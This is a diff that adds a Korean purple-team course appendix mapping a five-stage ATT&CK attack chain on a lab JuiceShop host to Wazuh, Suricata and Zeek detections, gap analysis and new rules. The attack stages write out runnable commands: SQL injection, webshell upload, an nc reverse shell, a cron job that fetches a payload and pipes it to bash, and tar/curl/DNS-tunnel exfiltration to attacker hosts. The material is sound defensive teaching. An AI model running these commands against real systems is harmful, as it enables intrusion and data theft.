@@ -1013,3 +1013,629 @@ graph LR
 
 **학생 액션**: SOC 운영 SLA 작성.
 
+
+---
+
+## 부록: 학습 OSS 도구 매트릭스 (Course14 SOC Advanced — Week 13 레드팀 연동·Purple Team·Atomic Red Team·ATT&CK Coverage)
+
+> 이 부록은 lab `soc-adv-ai/week13.yaml` (15 step + multi_task) 의 모든 명령을
+> 실제로 실행 가능한 형태로 정리한다. Purple Team 방법론, ATT&CK 5 단계 공격 시나리오,
+> Atomic Red Team / CALDERA 자동화, 탐지 매트릭스, 갭 분석, 즉시 개선까지.
+
+### lab step → 도구·Purple Team 매핑 표
+
+| step | 학습 항목 | 핵심 OSS 도구 | ATT&CK |
+|------|----------|--------------|--------|
+| s1 | Purple Team 개념 + Red/Blue 차이 | RACI + 운영 모델 표 | - |
+| s2 | ATT&CK 5+ Tactic 시나리오 | Navigator + Diamond Model | All |
+| s3 | Stage 1 Initial Access (SQLi) | sqlmap + curl + Burp | T1190 |
+| s4 | Stage 2 Execution (webshell + cmd) | weevely + bash + Wazuh detect | T1059.004 / T1505.003 |
+| s5 | Stage 3 Persistence (cron / SSH key) | crontab + ssh-copy-id | T1053.003 / T1098.004 |
+| s6 | Stage 4 Lateral (SSH key reuse) | ssh + impacket | T1021.004 |
+| s7 | Stage 5 Exfiltration (DNS/HTTP/encrypted) | dnscat2 + curl + age + Wazuh | T1041 / T1048 |
+| s8 | 탐지 결과 종합 매트릭스 | spreadsheet + Wazuh API | - |
+| s9 | 탐지 갭 분석 | DeTT&CT (week06·12) + 매핑 | - |
+| s10 | 즉시 개선 (신규 룰 + 재실행) | Wazuh + Sigma + 재시뮬 | - |
+| s11 | Atomic Red Team 자동화 | redcanaryco/atomic-red-team + invoke | - |
+| s12 | ATT&CK Navigator layer | sigma2attack + dettect + Navigator | - |
+| s13 | Purple Team 프로그램 (분기) | scenario rotation + RACI | - |
+| s14 | KPI (커버리지/MTTD/신규 룰) | spreadsheet + Grafana | - |
+| s15 | Purple Team 종합 보고서 | markdown + Coverage 변화 | - |
+| s99 | 통합 다단계 (s1→s2→s3→s4→s5) | Bastion plan: 개념→시나리오→Initial→Execution→Persistence | 다중 |
+
+### 학생 환경 준비
+
+```bash
+git clone https://github.com/redcanaryco/atomic-red-team /tmp/atomic
+sudo apt install -y powershell
+git clone https://github.com/redcanaryco/invoke-atomicredteam /tmp/iar
+
+# CALDERA (옵션)
+git clone https://github.com/mitre/caldera --recursive /tmp/caldera
+
+# 공격 도구 (course13 재사용)
+sudo apt install -y sqlmap nmap weevely curl
+
+# Wazuh + Suricata + Navigator (이미 설치)
+git clone https://github.com/mitre-attack/attack-navigator /tmp/nav 2>/dev/null
+
+# DeTT&CT (week06·12)
+git clone https://github.com/rabobank-cdc/DeTTECT /tmp/dettect 2>/dev/null
+
+# Sigma + sigma2attack (week03·06)
+pip install --user sigma-cli pysigma pysigma-backend-wazuh sigma2attack
+```
+
+### 핵심 도구별 상세 사용법
+
+#### 도구 1: Purple Team 방법론 (Step 1)
+
+| 비교 | Red | Blue | Purple |
+|------|-----|------|--------|
+| 목적 | 침투 검증 | 탐지/대응 | 격차 메우기 |
+| 참여자 | Red analyst | SOC analyst | Red + Blue + 진행자 |
+| 빈도 | 분기-연 1회 | 상시 | 분기 1회 |
+| 결과 | 침투 보고서 | 사고 통계 | 격차 매트릭스 + 신규 룰 |
+| 소통 | 사일로 | 사일로 | 실시간 양방향 |
+
+**운영 모델**:
+- **Open Book**: Red 공격 → Blue 즉시 탐지 → 격차 발견 즉시 룰 작성
+- **Closed Book**: Red 단독 → 종료 후 Blue 와 결과 비교
+
+#### 도구 2: ATT&CK 시나리오 설계 (Step 2)
+
+```
+=== Purple Team Scenario — "JuiceShop Compromise Chain" ===
+
+| Stage | Tactic | Technique | 도구 | 예상 탐지 |
+|-------|--------|-----------|------|----------|
+| 1 | Initial Access | T1190 | sqlmap | Wazuh 100200 |
+| 2 | Execution | T1059.004 | bash via webshell | Wazuh 5402 + Suricata |
+| 2 | Execution | T1505.003 | weevely upload | Wazuh 100450 |
+| 3 | Persistence | T1053.003 | crontab + script | Wazuh 5106 |
+| 3 | Persistence | T1098.004 | ssh-copy-id | Wazuh 5715 + auditd |
+| 4 | Lateral | T1021.004 | ssh + impacket | Wazuh 5715 + auth.log |
+| 5 | Exfiltration | T1041 | tar + nc | Suricata + Zeek |
+| 5 | Exfiltration | T1048.003 | curl POST | Wazuh + Apache |
+
+## Diamond Model
+- Adversary: Purple Team Red
+- Capability: sqlmap, weevely, ssh, dnscat2
+- Infrastructure: 192.168.1.50, evil-c2.example
+- Victim: web (10.20.30.80), siem (10.20.30.100)
+
+## 평가 기준
+- 탐지 성공: Wazuh / Suricata 알림 + level 적절
+- 시간: 발생 ~ 알림 < 60s
+- TP: 알림이 실제 매칭
+- FP: 정상 잘못 매칭
+```
+
+#### 도구 3: Stage 1 — Initial Access (Step 3)
+
+```bash
+ATTACKER=10.20.30.112
+WEB=10.20.30.80
+
+# Red
+ssh ccc@$ATTACKER 'curl -s "http://10.20.30.80/rest/products/search?q=apple" | head'
+ssh ccc@$ATTACKER 'sqlmap -u "http://10.20.30.80/rest/products/search?q=*" --batch --random-agent --threads=4'
+ssh ccc@$ATTACKER 'curl -s "http://10.20.30.80/rest/products/search?q=\\\")) UNION SELECT id,email,password,\\'4\\',\\'5\\',\\'6\\',\\'7\\',\\'8\\',\\'9\\' FROM Users--"'
+
+# Blue 실시간 모니터링
+ssh ccc@10.20.30.100 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.id==\"100200\" or .rule.id==\"100250\") | {ts:.timestamp,src:.data.srcip,desc:.rule.description}"'
+ssh ccc@10.20.30.1 'sudo tail -f /var/log/suricata/eve.json | jq -r "select(.event_type==\"alert\" and .alert.signature_id >= 2003001) | {ts:.timestamp,src:.src_ip,sig:.alert.signature}"'
+```
+
+| 시도 | Wazuh | Suricata | 비고 |
+|------|-------|----------|------|
+| 정상 GET | - | - | baseline |
+| sqlmap | 100200 (lvl 6) | 2024793 | ✓ |
+| 수동 UNION | 100200 + 100250 (lvl 14) | 2024793 | ✓ |
+| Time-based blind | 미탐지 ★ | 2024798 | ✗ Wazuh 갭 |
+
+#### 도구 4: Stage 2 — Execution (Step 4)
+
+```bash
+# Red
+ssh ccc@$ATTACKER 'weevely generate s3cret /tmp/shell.php'
+ssh ccc@$ATTACKER 'curl -X POST "http://10.20.30.80/api/Files" -H "Authorization: Bearer $TOKEN" -F "file=@/tmp/shell.php"'
+ssh ccc@$ATTACKER 'weevely http://10.20.30.80/uploads/shell.php s3cret'
+# > id; whoami; cat /etc/passwd; nc -e /bin/sh 192.168.1.50 4444
+
+# Blue
+ssh ccc@10.20.30.100 'sudo grep "100450" /var/ossec/logs/alerts/alerts.log | tail'
+ssh ccc@10.20.30.1 'sudo grep -i "shell.php" /var/log/suricata/eve.json | head'
+ssh ccc@10.20.30.80 'sudo grep "shell.php" /var/log/apache2/access.log | tail'
+```
+
+| 시도 | Wazuh | Suricata | Apache | 비고 |
+|------|-------|----------|--------|------|
+| webshell upload | 100450 (lvl 12) | - | ✓ | ✓ syscheck |
+| webshell access | - | 2018987 | ✓ | ⚠ Wazuh 미탐지 (Apache log 룰 부재) |
+| reverse shell | 5402 (sudo) | 2008470 | - | ✓ |
+
+#### 도구 5: Stage 3 — Persistence (Step 5)
+
+```bash
+# Red
+ssh ccc@web 'echo "*/5 * * * * curl -s http://192.168.1.50/payload.sh | bash" | sudo tee /etc/cron.d/backup'
+ssh ccc@web 'mkdir -p /home/ccc/.ssh && echo "ssh-rsa AAAA... attacker@kali" >> /home/ccc/.ssh/authorized_keys'
+
+# Blue
+ssh ccc@10.20.30.100 'sudo grep "5106" /var/ossec/logs/alerts/alerts.log | tail'
+ssh ccc@web 'sudo ausearch -k cron_change --start recent | head'
+ssh ccc@web 'sudo ausearch -k home_change --start recent | head'
+```
+
+| 시도 | Wazuh | auditd | 비고 |
+|------|-------|--------|------|
+| cron 추가 | 5106 (lvl 8) | cron_change | ✓ |
+| authorized_keys | - | home_change | ⚠ Wazuh 미탐지 (syscheck 미설정) |
+| systemd unit | - | - | ✗ 양측 미탐지 |
+
+#### 도구 6: Stage 4 — Lateral Movement (Step 6)
+
+```bash
+# Red
+ssh ccc@web 'ssh -i /home/ccc/.ssh/id_rsa ccc@10.20.30.100 "id; ls /var/ossec/etc/"'
+ssh ccc@web 'sshpass -p ccc123 ssh ccc@10.20.30.100 id'
+
+# Blue
+ssh ccc@10.20.30.100 'sudo grep "5715" /var/ossec/logs/alerts/alerts.log | grep "10.20.30.80" | tail'
+```
+
+| 시도 | Wazuh | 비고 |
+|------|-------|------|
+| SSH key (web → siem) | 5715 ★ | ✗ 정상 SSH 와 구분 안 됨 |
+| sshpass brute | 5712 ★★★ | ✓ |
+
+#### 도구 7: Stage 5 — Exfiltration (Step 7)
+
+```bash
+# 1. tar + nc
+ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data 2>/dev/null | nc 192.168.1.50 4444'
+
+# 2. HTTP POST
+ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data | curl -X POST -H "Content-Type: application/octet-stream" --data-binary @- http://192.168.1.50/upload'
+
+# 3. DNS 터널 (week06)
+ssh ccc@10.20.30.100 '
+  while read line; do
+    encoded=$(echo "$line" | base64)
+    dig +short ${encoded:0:30}.tunnel.evil-c2.example >/dev/null
+  done < /var/ossec/logs/alerts/alerts.log
+'
+
+# 4. 암호화 + age + nc
+ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data | age -r age1abc... | nc 192.168.1.50 4444'
+
+# Blue
+ssh ccc@10.20.30.1 'sudo zeek-cut id.orig_h id.resp_h orig_bytes resp_bytes < /var/log/zeek/conn.log | awk "$3 > 10485760"'
+ssh ccc@10.20.30.1 'sudo zeek-cut query < /var/log/zeek/dns.log | awk "{ if (length($1) > 50) print }"'
+```
+
+| 시도 | Suricata | Wazuh | Zeek | 비고 |
+|------|----------|-------|------|------|
+| tar+nc | 9000001 | 100600 (combo) | conn.log 대용량 | ✓ |
+| HTTP POST | - | - | http.log | ⚠ 응답 size 룰 부재 |
+| DNS 터널 | - | - | dns.log entropy | ✗ Wazuh 미탐지 |
+| age + nc | - | - | conn.log encrypted | ⚠ TLS 변조 가능 |
+
+#### 도구 8: 종합 매트릭스 (Step 8)
+
+```
+| Stage | Technique | Wazuh | Suricata | Zeek | auditd | Apache | TheHive |
+|-------|-----------|-------|----------|------|--------|--------|---------|
+| 1 | T1190 | ✓ | ✓ | - | - | ✓ | ✓ |
+| 2 | T1059.004 | ✓ | ✓ | - | - | - | ✓ |
+| 2 | T1505.003 | ✓ | - | - | - | ✓ | ✓ |
+| 3 | T1053.003 | ✓ | - | - | ✓ | - | ✓ |
+| 3 | T1098.004 | ✗ | - | - | ✓ | - | - |
+| 4 | T1021.004 | ⚠ | - | - | - | - | - |
+| 5 | T1041 | ✓ | ✓ | ✓ | - | - | - |
+| 5 | T1048 | ✗ | - | - | - | - | - |
+
+## 통계
+- ✓ Detect: 5 (56%) / ⚠ Partial: 2 / ✗ Miss: 4 (중복)
+- 평균 MTTD: 7s
+- Tool 효과: Wazuh 5/9, Suricata 4/9, Zeek 1/9, auditd 2/9
+```
+
+#### 도구 9: 갭 분석 (Step 9)
+
+```bash
+cd /tmp/dettect
+cat > /tmp/visibility-current.yaml << 'YML'
+version: 1.4
+file_type: visibility
+domain: enterprise-attack
+name: SOC Visibility 2026-Q2
+techniques:
+  - technique_id: T1190
+    visibility: {score: 4, comment: "Wazuh 100200 + Suricata 2024793"}
+  - technique_id: T1059.004
+    visibility: {score: 3, comment: "Wazuh 5402 (sudo) only"}
+  - technique_id: T1098.004
+    visibility: {score: 1, comment: "auditd watch만"}
+  - technique_id: T1021.004
+    visibility: {score: 2, comment: "정상 SSH 구분 어려움"}
+  - technique_id: T1041
+    visibility: {score: 4, comment: "Suricata + Zeek"}
+  - technique_id: T1048.003
+    visibility: {score: 1, comment: "HTTP POST size 룰 부재"}
+YML
+
+python dettect.py v -ft /tmp/visibility-current.yaml -l
+```
+
+| Technique | 점수 | 갭 원인 | 개선 |
+|-----------|------|---------|------|
+| T1098.004 | 1 | Wazuh syscheck 미설정 | /home/*/.ssh/authorized_keys watch |
+| T1021.004 | 2 | 정상 SSH 구분 어려움 | internal-to-internal 패턴 룰 |
+| T1048.003 | 1 | response size 룰 부재 | response_size > 100MB Wazuh rule |
+| T1071.004 | 0 | 미수집 + 룰 부재 | DNS log + entropy 룰 (week06) |
+| T1027 | 0 | strings 분석 부재 | YARA Wazuh 통합 (week04) |
+
+Root Cause: 데이터 소스 부재 (40%) / 룰 부재 (40%) / 룰 우회 (20%)
+
+#### 도구 10: 즉시 개선 + 재시뮬 (Step 10)
+
+```bash
+# 신규 룰
+ssh ccc@web 'sudo tee -a /var/ossec/etc/ossec.conf' << 'XML'
+<syscheck>
+  <directories check_all="yes" report_changes="yes" realtime="yes">/home/ccc/.ssh,/root/.ssh</directories>
+</syscheck>
+XML
+
+ssh ccc@10.20.30.100 'sudo tee -a /var/ossec/etc/rules/local_rules.xml' << 'XML'
+<group name="custom,persistence,">
+  <rule id="100850" level="13">
+    <if_sid>550,553</if_sid>
+    <field name="file">authorized_keys</field>
+    <description>SSH authorized_keys 변경 — Persistence (T1098.004)</description>
+    <mitre><id>T1098.004</id></mitre>
+  </rule>
+</group>
+
+<group name="custom,lateral,">
+  <rule id="100851" level="11">
+    <if_sid>5715</if_sid>
+    <srcip>10.20.30.0/24</srcip>
+    <description>Internal-to-internal SSH — lateral 의심</description>
+    <mitre><id>T1021.004</id></mitre>
+  </rule>
+
+  <rule id="100852" level="13">
+    <if_sid>100851</if_sid>
+    <user>!^admin$</user>
+    <weekday>weekdays</weekday>
+    <time>22:00-06:00</time>
+    <description>Off-hours internal SSH by non-admin — high risk</description>
+  </rule>
+</group>
+
+<group name="custom,exfil,">
+  <rule id="100853" level="13">
+    <if_sid>31100</if_sid>
+    <regex>response_size > 104857600</regex>
+    <description>HTTP large response — exfil (T1048.003)</description>
+    <mitre><id>T1048.003</id></mitre>
+  </rule>
+</group>
+XML
+
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control restart'
+
+# 재시뮬
+ssh ccc@web 'echo "ssh-rsa AAAA... new" >> /home/ccc/.ssh/authorized_keys'
+sleep 30
+ssh ccc@10.20.30.100 'sudo grep "100850" /var/ossec/logs/alerts/alerts.log | tail'
+```
+
+| Technique | Before | After | Δ |
+|-----------|--------|-------|---|
+| T1098.004 | 1 | 4 | +3 |
+| T1021.004 | 2 | 3 | +1 |
+| T1048.003 | 1 | 4 | +3 |
+| 평균 | 1.3 | 3.7 | **+2.4** |
+
+#### 도구 11: Atomic Red Team 자동화 (Step 11)
+
+```bash
+ls /tmp/atomic/atomics/T1190/
+cat /tmp/atomic/atomics/T1190/T1190.md | head -30
+
+# Invoke (PowerShell)
+pwsh -c "Import-Module /tmp/iar/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest T1190 -ShowDetailsBrief"
+pwsh -c "Import-Module /tmp/iar/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest T1190 -CheckPrereqs"
+pwsh -c "Import-Module /tmp/iar/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest T1190-1"
+pwsh -c "Import-Module /tmp/iar/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest T1190 -Cleanup"
+
+# Bash 자동화
+cat > /tmp/run-atomic-purple.sh << 'SH'
+#!/bin/bash
+TECHNIQUES=("T1190" "T1059.004" "T1053.003" "T1021.004" "T1041")
+
+for t in "${TECHNIQUES[@]}"; do
+    echo "=== Executing $t ==="
+    BEFORE=$(curl -sk -u admin:admin "https://siem:9200/wazuh-alerts-*/_count?q=rule.mitre.id:$t" | jq .count)
+    
+    pwsh -c "Import-Module /tmp/iar/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest $t" 2>&1 | tail -5
+    
+    sleep 30
+    AFTER=$(curl -sk -u admin:admin "https://siem:9200/wazuh-alerts-*/_count?q=rule.mitre.id:$t" | jq .count)
+    
+    DELTA=$((AFTER - BEFORE))
+    [ $DELTA -gt 0 ] && echo "  ✓ Detected (alerts +$DELTA)" || echo "  ✗ MISS"
+    
+    pwsh -c "Import-Module /tmp/iar/Invoke-AtomicRedTeam.psd1; Invoke-AtomicTest $t -Cleanup" 2>/dev/null
+    sleep 5
+done
+SH
+sudo /tmp/run-atomic-purple.sh
+```
+
+#### 도구 12: ATT&CK Navigator (Step 12)
+
+```bash
+# Sigma → Coverage layer
+sigma2attack --rules-directory ~/sigma-rules/ --out-file /tmp/sigma-coverage.json
+
+# DeTT&CT → Visibility / Detection layer
+python /tmp/dettect/dettect.py d -fd /tmp/data-sources-current.yaml -l
+python /tmp/dettect/dettect.py v -ft /tmp/visibility-current.yaml -l
+
+# Purple Team 결과 layer (수기)
+cat > /tmp/purple-result-layer.json << 'JSON'
+{
+  "name": "Purple Team Result 2026-Q2",
+  "versions": {"attack": "14", "navigator": "4.9.4", "layer": "4.5"},
+  "domain": "enterprise-attack",
+  "techniques": [
+    {"techniqueID": "T1190", "score": 100, "color": "#00ff00", "comment": "Wazuh + Suricata"},
+    {"techniqueID": "T1059.004", "score": 80, "color": "#aaff00", "comment": "Wazuh sudo only"},
+    {"techniqueID": "T1505.003", "score": 90, "color": "#00ff00", "comment": "Wazuh syscheck"},
+    {"techniqueID": "T1053.003", "score": 95, "color": "#00ff00", "comment": "Wazuh + auditd"},
+    {"techniqueID": "T1098.004", "score": 30, "color": "#ffaa00", "comment": "auditd만, 룰 추가"},
+    {"techniqueID": "T1021.004", "score": 50, "color": "#ffff00", "comment": "정상 SSH 구분 약함"},
+    {"techniqueID": "T1041", "score": 95, "color": "#00ff00", "comment": "combo + Zeek"},
+    {"techniqueID": "T1048.003", "score": 40, "color": "#ffaa00", "comment": "신규 100853"}
+  ],
+  "gradient": {"colors": ["#ff0000","#ffff00","#00ff00"], "minValue": 0, "maxValue": 100},
+  "metadata": [
+    {"name": "engagement", "value": "Purple Team Q2 2026"},
+    {"name": "miss_before", "value": "4"},
+    {"name": "miss_after", "value": "0"}
+  ]
+}
+JSON
+# Navigator 에 import → Compare layers (Before vs After)
+```
+
+#### 도구 13: Purple Team 프로그램 (Step 13)
+
+```
+| 분기 | 시점 | 시나리오 | 우선순위 |
+|------|------|---------|---------|
+| Q1 (Mar) | 마지막 주 | Web → Lateral → Exfil | High |
+| Q2 (Jun) | 마지막 주 | 랜섬웨어 시뮬 | Critical |
+| Q3 (Sep) | 마지막 주 | Cloud / Container | High |
+| Q4 (Dec) | 마지막 주 | APT 종합 (full chain) | Critical |
+
+## RACI
+| 항목 | Red Lead | Blue Lead | SOC Manager | CISO |
+|------|---------|-----------|-------------|------|
+| 시나리오 작성 | A | C | R | I |
+| 일정 조율 | C | C | A | I |
+| 실행 | R | R | A | I |
+| 결과 분석 | C | A/R | R | I |
+| 개선 | C | A/R | R | C |
+| 보고 | C | C | R | A |
+
+## 운영
+- Pre-engagement (1주 전): scenario lock + 환경
+- Day 0: 시뮬 + 매트릭스
+- Day +1 (1주): 갭 분석 + 신규 룰
+- Day +2 (2주): 재시뮬 + 효과
+- Day +3 (3주): AAR
+- 분기 후: 다음 plan
+```
+
+#### 도구 14: KPI 측정 (Step 14)
+
+| KPI | 정의 | 측정 |
+|-----|------|------|
+| Coverage 증가 | visibility 점수 평균 | DeTT&CT layer |
+| MTTD 단축 | 시뮬 → 알림 | Wazuh @timestamp - decoder.timestamp |
+| 신규 탐지 룰 | 분기당 SIGMA / Wazuh rule | git log |
+| Improved 데이터 소스 | 신규 추가 | DeTT&CT data source |
+| FP rate | 신규 룰 FP | 7일 운영 후 review |
+| 분석가 confidence | survey (1-5) | 분기 survey |
+| 시나리오 완료율 | 계획 / 실제 | 분기 보고 |
+
+```python
+import json
+before = json.load(open('/tmp/coverage-before.json'))
+after = json.load(open('/tmp/coverage-after.json'))
+
+before_avg = sum(t['score'] for t in before['techniques']) / len(before['techniques'])
+after_avg = sum(t['score'] for t in after['techniques']) / len(after['techniques'])
+print(f"Coverage Average: {before_avg:.1f} → {after_avg:.1f} (+{after_avg-before_avg:.1f})")
+
+before_map = {t['techniqueID']: t['score'] for t in before['techniques']}
+after_map = {t['techniqueID']: t['score'] for t in after['techniques']}
+for t_id in sorted(set(before_map) | set(after_map)):
+    b = before_map.get(t_id, 0); a = after_map.get(t_id, 0)
+    if a - b != 0: print(f"  {t_id}: {b} → {a} (Δ{a-b:+d})")
+```
+
+#### 도구 15: 종합 보고서 (Step 15)
+
+```bash
+cat > /tmp/purple-team-report.md << 'EOF'
+# Purple Team Report — 2026-Q2
+
+## 1. Executive Summary
+- 시나리오: JuiceShop Compromise Chain (5 stage)
+- 시뮬 일자: 2026-06-25
+- 참가자: Red 2 + Blue 4 + Manager 1
+- 결과: 8 technique → 5 ✓ / 2 ⚠ / 4 ✗ → 개선 후 8 ✓
+
+## 2. 결과 매트릭스 (Before)
+[위 도구 8 참조]
+
+## 3. 갭 분석
+[위 도구 9 참조]
+
+## 4. 개선 (즉시)
+- Wazuh rule: 100850 (authorized_keys), 100851~852 (lateral), 100853 (HTTP exfil)
+- syscheck: /home/*/.ssh, /root/.ssh
+
+## 5. After
+- ✓ Detect: 5 → 8 (89%)
+- 평균 visibility: 1.3 → 3.7 (+2.4)
+- MTTD: 7s → 5s
+
+## 6. KPI
+- Coverage 증가: 9% (목표 5%)
+- 신규 룰: 7
+- FP rate: 2%
+
+## 7. Lessons
+### 잘된 점
+- Open Book 효과 (실시간 룰 작성)
+- 양측 다층 탐지
+
+### 개선점
+- DNS / HTTP exfil 미커버
+- SSH lateral 분리 어려움
+
+## 8. Action Items
+| 항목 | 담당 | 마감 |
+|------|------|------|
+| Wazuh DNS log | Engineer | 2주 |
+| HTTP response size 룰 | SOC | 1주 |
+| Atomic Red Team CI | Engineer | 1개월 |
+| 다음 분기 (랜섬웨어) | All | 분기 |
+
+## 9. 향후
+- Q3: 랜섬웨어 (week09 + week10 playbook)
+- Q4: Cloud (course13 도구)
+- 2027 Q1: AI 공격 (course15)
+EOF
+
+pandoc /tmp/purple-team-report.md -o /tmp/purple-team-report.pdf \
+  --pdf-engine=xelatex --toc -V mainfont="Noto Sans CJK KR"
+```
+
+### 점검 / 시뮬 / 개선 흐름 (15 step + multi_task)
+
+#### Phase A — 설계 + 5 단계 시뮬 (s1·s2·s3~s7)
+
+```bash
+vi /tmp/purple-scenario.md   # 시나리오
+
+# Stage 1-5 (도구 3-7)
+ssh ccc@$ATTACKER 'sqlmap -u "..." --batch'
+ssh ccc@$ATTACKER 'curl -X POST "http://10.20.30.80/api/Files" ...'
+ssh ccc@web 'echo "..." | sudo tee /etc/cron.d/backup'
+ssh ccc@web 'ssh -i id_rsa ccc@10.20.30.100 id'
+ssh ccc@10.20.30.100 'tar -czf - /var/ossec/data | nc 192.168.1.50 4444'
+
+# 실시간 모니터링
+ssh ccc@10.20.30.100 'sudo tail -f /var/ossec/logs/alerts/alerts.json | jq -r "select(.rule.mitre.id != null)"'
+```
+
+#### Phase B — 매트릭스 + 갭 (s8·s9)
+
+```bash
+vi /tmp/purple-team-matrix.md
+python /tmp/dettect/dettect.py v -ft /tmp/visibility-current.yaml -l
+```
+
+#### Phase C — 개선 + 재시뮬 + 보고 (s10·s11·s12·s13·s14·s15)
+
+```bash
+ssh ccc@10.20.30.100 'sudo vi /var/ossec/etc/rules/local_rules.xml'
+ssh ccc@10.20.30.100 'sudo /var/ossec/bin/wazuh-control restart'
+
+sudo /tmp/run-atomic-purple.sh
+
+python3 /tmp/coverage-diff.py
+pandoc /tmp/purple-team-report.md -o /tmp/purple-team-report.pdf
+```
+
+#### Phase D — 통합 시나리오 (s99 multi_task)
+
+s1 → s2 → s3 → s4 → s5 를 Bastion 가 한 번에:
+
+1. **plan**: Purple Team 개념 → ATT&CK 5 stage → Initial → Execution → Persistence
+2. **execute**: sqlmap + weevely + bash + ssh + Wazuh detect
+3. **synthesize**: 5 산출물 (concept.md / scenario.md / stage1.md / stage2.md / stage3.md)
+
+### 도구 비교표 — Purple Team 단계별
+
+| 단계 | 1순위 | 2순위 | 사용 |
+|------|-------|-------|------|
+| 시나리오 | ATT&CK Navigator + Diamond | TIBER-EU template | 표준 |
+| 자동 시뮬 | Atomic Red Team + invoke | CALDERA / Stratus | OSS |
+| 매트릭스 | Google Docs / Notion 실시간 | Confluence | 협업 |
+| Visibility | DeTT&CT | manual | 정량 |
+| 시각화 | ATT&CK Navigator | DeTT&CT layer | 표준 |
+| 신규 룰 | Sigma + Wazuh | Splunk SPL | OSS |
+| KPI | spreadsheet + Grafana | dedicated tool | 단순 |
+| 보고 | pandoc + LaTeX | Word | 기술 |
+| 협업 | Slack #purple-team | MS Teams | OSS |
+| 케이스 | TheHive | DFIR-IRIS | week10 |
+| 일정 | RACI + mermaid Gantt | MS Project | OSS |
+| Lessons | AAR (week11) | dedicated tool | 단순 |
+
+### 도구 선택 매트릭스 — 시나리오별 권장
+
+| 시나리오 | 우선 도구 | 이유 |
+|---------|---------|------|
+| "처음 Purple Team" | Open Book + Atomic + Navigator | 학습 |
+| "regulator audit" | DeTT&CT + Coverage layer + 정량 | 정형 |
+| "신속 시뮬" | Atomic Red Team CI 자동 | 반복 |
+| "복잡 시나리오" | CALDERA + manual scenario | depth |
+| "분기 운영" | RACI + Gantt + AAR | 정형 |
+| "Cloud 시뮬" | Stratus Red Team (course13) | cloud |
+| "AI 시뮬" | (course15 도구) | 미래 |
+
+### 학생 셀프 체크리스트 (각 step 완료 기준)
+
+- [ ] s1: Red/Blue/Purple 비교 + Open vs Closed Book
+- [ ] s2: ATT&CK 5+ Tactic 시나리오 + Diamond
+- [ ] s3: SQLi 3 단계 + Wazuh + Suricata 매트릭스
+- [ ] s4: webshell + 실행 + reverse shell + 매트릭스
+- [ ] s5: cron + authorized_keys + 매트릭스
+- [ ] s6: SSH key reuse + brute + lateral 매트릭스
+- [ ] s7: 4 종 exfil + 매트릭스
+- [ ] s8: 9 technique × 6 도구 종합 + 통계
+- [ ] s9: DeTT&CT visibility + 갭 root cause 3 카테고리
+- [ ] s10: 신규 Wazuh rule 3 + 재시뮬
+- [ ] s11: Atomic Red Team CheckPrereqs + Invoke + Cleanup + bash 자동화
+- [ ] s12: Sigma2attack + DeTT&CT + Purple result 3 layer
+- [ ] s13: 분기 시나리오 + RACI + 운영 모델
+- [ ] s14: 7+ KPI + Coverage diff + MTTD
+- [ ] s15: 종합 보고서 (Executive/시나리오/Before/갭/개선/After/KPI/Lessons)
+- [ ] s99: Bastion 가 5 작업 (개념/시나리오/Initial/Execution/Persistence) 순차
+
+### 추가 참조 자료
+
+- **Atomic Red Team** https://github.com/redcanaryco/atomic-red-team
+- **Invoke-AtomicRedTeam** https://github.com/redcanaryco/invoke-atomicredteam
+- **CALDERA** https://github.com/mitre/caldera
+- **DeTT&CT** https://github.com/rabobank-cdc/DeTTECT
+- **MITRE ATT&CK Navigator** https://mitre-attack.github.io/attack-navigator/
+- **Sigma2Attack** https://github.com/marbl3z/sigma2attack
+- **Purple Team Field Manual** Andrew Pease
+- **MITRE Center for Threat-Informed Defense — Adversary Emulation Library** https://github.com/center-for-threat-informed-defense/adversary_emulation_library
+- **TIBER-EU** Threat Intelligence-Based Ethical Red Teaming
+- **Stratus Red Team** (Cloud, course13)
+
+위 모든 Purple Team 작업은 **격리 lab + 사전 동의 + RoE** 로 수행한다. Atomic Red Team 의
+일부 atomic 은 실 시스템 변경 (cron, registry) — 격리 VM 에서만, 항상 cleanup. **Open Book
+모델 권장** (실시간 협업 + 즉시 룰 작성). 분기별 Coverage 증가 +5% 이상이 정상.
